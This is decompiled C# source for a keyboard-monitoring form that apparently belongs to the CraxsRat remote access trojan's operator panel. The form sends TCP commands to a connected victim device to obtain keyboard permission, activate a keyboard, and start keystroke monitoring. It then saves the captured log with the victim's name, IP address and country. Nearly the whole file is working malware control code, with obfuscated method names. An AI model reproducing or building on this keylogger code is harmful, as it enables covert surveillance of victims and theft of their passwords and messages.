using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000087 RID: 135
[DesignerGenerated]
public partial class KeyboardManager : Form
{
	// Token: 0x0600062B RID: 1579 RVA: 0x0009EF04 File Offset: 0x0009D104
	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.checkbutton.Text = "检查权限";
				this.savebutton.Text = "保存日志";
				this.primtext.Text = "键盘权限";
				this.acttext.Text = "激活键盘";
				this.montext.Text = "开始监控";
			}
		}
		else
		{
			this.checkbutton.Text = "فحص الصلاحيات";
			this.savebutton.Text = "حفظ السجل";
			this.primtext.Text = "صلاحية لوحة المفاتيح";
			this.acttext.Text = "تفعيل لوحة المفاتيح";
			this.montext.Text = "تفعيل المراقبة";
		}
	}

	// Token: 0x0600062C RID: 1580 RVA: 0x00003198 File Offset: 0x00001398
	public KeyboardManager()
	{
		base.FormClosing += this.KeyboardManager_FormClosing;
		this.InitializeComponent();
		this.CraxsStyle();
	}

	// Token: 0x0600062D RID: 1581 RVA: 0x0009EFE0 File Offset: 0x0009D1E0
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz(object[] obj)
	{
		if (this.statustext.InvokeRequired)
		{
			KeyboardManager.updatedele method = new KeyboardManager.updatedele(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz);
			this.statustext.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string str = Conversions.ToString(obj[0]);
			this.statustext.AppendText("--->" + str + "\r\n");
			this.statustext.SelectionStart = this.statustext.Text.Length;
			this.statustext.ScrollToCaret();
		}
	}

	// Token: 0x0600062E RID: 1582 RVA: 0x0009F06C File Offset: 0x0009D26C
	public void UpdatePrims(object[] obj)
	{
		if (base.InvokeRequired)
		{
			KeyboardManager.recordnames method = new KeyboardManager.recordnames(this.UpdatePrims);
			base.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string[] array = (string[])obj[0];
			this.statustext.Text = "";
			if (Operators.CompareString(array[0], "1", false) == 0)
			{
				this.checkkeypermission.Checked = true;
				this.checkkeypermission.Enabled = false;
				this.statustext.AppendText("--->Permission Granted\r\n");
			}
			else
			{
				this.checkkeypermission.Checked = false;
				this.checkkeypermission.Enabled = true;
			}
			if (Operators.CompareString(array[1], "1", false) == 0)
			{
				this.checkselected.Checked = true;
				this.checkselected.Enabled = false;
				this.statustext.AppendText("--->Keyboard Active now\r\n");
			}
			else
			{
				this.checkselected.Checked = false;
				this.checkselected.Enabled = true;
			}
		}
	}

	// Token: 0x0600062F RID: 1583 RVA: 0x0009F168 File Offset: 0x0009D368
	private void Checkenable_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkkeypermission.Enabled | this.checkselected.Enabled)
		{
			EagleAlert.Showinformation("Please Enable 1 & 2 first");
			this.checkenable.Checked = false;
		}
		else if (this.checkenable.Checked)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"KBO<*>ENB:1",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
		}
		else if (this.Classclient != null)
		{
			TcpClient myClient2 = this.Classclient.myClient;
			string[] array2 = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects2 = new object[]
			{
				myClient2,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"KBO<*>ENB:2",
					Data.SPL_SOCKET,
					array2[0],
					Data.SPL_SOCKET,
					array2[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects2);
		}
	}

	// Token: 0x06000630 RID: 1584 RVA: 0x0009F3E0 File Offset: 0x0009D5E0
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"KBO<*>lod",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000631 RID: 1585 RVA: 0x0009F4F8 File Offset: 0x0009D6F8
	private void Checkkeypermission_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkkeypermission.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"KBO<*>AKP",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000632 RID: 1586 RVA: 0x0009F620 File Offset: 0x0009D820
	private void Checkselected_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkselected.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"KBO<*>AKA",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000633 RID: 1587 RVA: 0x0009F748 File Offset: 0x0009D948
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.statustext.Text))
		{
			EagleAlert.Showinformation("No log found to save");
		}
		else
		{
			try
			{
				if (!Directory.Exists(this.Classclient.FolderUSER + "\\KeyBoard"))
				{
					Directory.CreateDirectory(this.Classclient.FolderUSER + "\\KeyBoard");
				}
				string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
				if (!File.Exists(this.Classclient.FolderUSER + "\\KeyBoard\\" + text))
				{
					File.Create(this.Classclient.FolderUSER + "\\KeyBoard\\" + text).Dispose();
					File.AppendAllText(this.Classclient.FolderUSER + "\\KeyBoard\\" + text, string.Concat(new string[]
					{
						"Client Name: ",
						this.Classclient.ClientName,
						"\r\nClient IP: ",
						this.Classclient.ClientAddressIP,
						"\r\nCountry: ",
						this.Classclient.Country,
						"\r\nDate :",
						DateTime.Now.ToString(),
						"\r\n----------------------------------------\r\n"
					}));
				}
				File.AppendAllText(this.Classclient.FolderUSER + "\\KeyBoard\\" + text, text + this.statustext.Text + "\r\n");
				Process.Start(this.Classclient.FolderUSER + "\\KeyBoard");
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000634 RID: 1588 RVA: 0x0009F90C File Offset: 0x0009DB0C
	private void KeyboardManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.checkenable.Checked)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"KBO<*>ENB:2",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x040008F8 RID: 2296
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbutton")]
	private DrakeUIButtonIcon _checkbutton;

	// Token: 0x040008F9 RID: 2297
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savebutton")]
	private DrakeUIButtonIcon _savebutton;

	// Token: 0x040008FA RID: 2298
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkenable")]
	private DrakeUICheckBox _checkenable;

	// Token: 0x040008FB RID: 2299
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkselected")]
	private DrakeUICheckBox _checkselected;

	// Token: 0x040008FC RID: 2300
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkkeypermission")]
	private DrakeUICheckBox _checkkeypermission;

	// Token: 0x040008FD RID: 2301
	public Client Classclient;

	// Token: 0x02000088 RID: 136
	// (Invoke) Token: 0x06000636 RID: 1590
	public delegate void updatedele(object[] obj);

	// Token: 0x02000089 RID: 137
	// (Invoke) Token: 0x0600063A RID: 1594
	public delegate void recordnames(object[] obj);
}
